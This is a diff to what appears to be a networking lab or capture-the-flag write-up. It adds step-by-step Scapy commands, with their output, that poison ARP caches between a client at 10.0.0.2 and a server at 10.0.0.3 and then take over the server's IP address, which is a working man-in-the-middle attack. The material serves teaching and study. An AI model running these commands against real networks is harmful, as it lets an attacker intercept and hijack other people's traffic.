@@ -2372,7 +2372,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-First, we have to send an ARP request to `10.0.0.2` and retrieve its MAC address.
+First, we have to send an ARP request to the client at `10.0.0.2` and retrieve its MAC address.
 
 ```py
 >>> (Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="10.0.0.2")).display()
@@ -2559,3 +2559,48 @@ network.run()
 
 user_host.interactive(environ=parent_process.environ())
 ```
+
+Find client MAC.
+
+```
+>>> srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.0.0.2"), timeout=2).hwsrc
+Begin emission
+
+Finished sending 1 packets
+*
+Received 1 packets, got 1 answers, remaining 0 packets
+'82:9b:33:50:df:78'
+```
+
+Find server MAC.
+
+```
+>>> srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.0.0.3"), timeout=2).hwsrc
+Begin emission
+
+Finished sending 1 packets
+*
+Received 1 packets, got 1 answers, remaining 0 packets
+'22:fb:43:d8:0f:89'
+```
+
+Tell 10.0.0.2 (ClientHost) that you are 10.0.0.3 (ServerHost):
+
+```
+>>> sendp(Ether(dst="82:9b:33:50:df:78")/ARP(op=2, psrc="10.0.0.3", pdst="10.0.0.2", hwsrc=get_if_hwaddr("eth0"), hwdst="82:9b:33:50:df:78"), iface="eth0", count=5)
+.....
+Sent 5 packets.
+```
+
+Tell 10.0.0.3 (ServerHost) that you are 10.0.0.2 (ClientHost):
+
+```
+>>> sendp(Ether(dst="22:fb:43:d8:0f:89")/ARP(op=2, psrc="10.0.0.2", pdst="10.0.0.3", hwsrc=get_if_hwaddr("eth0"), hwdst="22:fb:43:d8:0f:89"), iface="eth0", count=5)
+.....
+Sent 5 packets.
+```
+
+```
+root@ip-10-0-0-1:/# ip addr add 10.0.0.3/24 dev eth0
+```
+
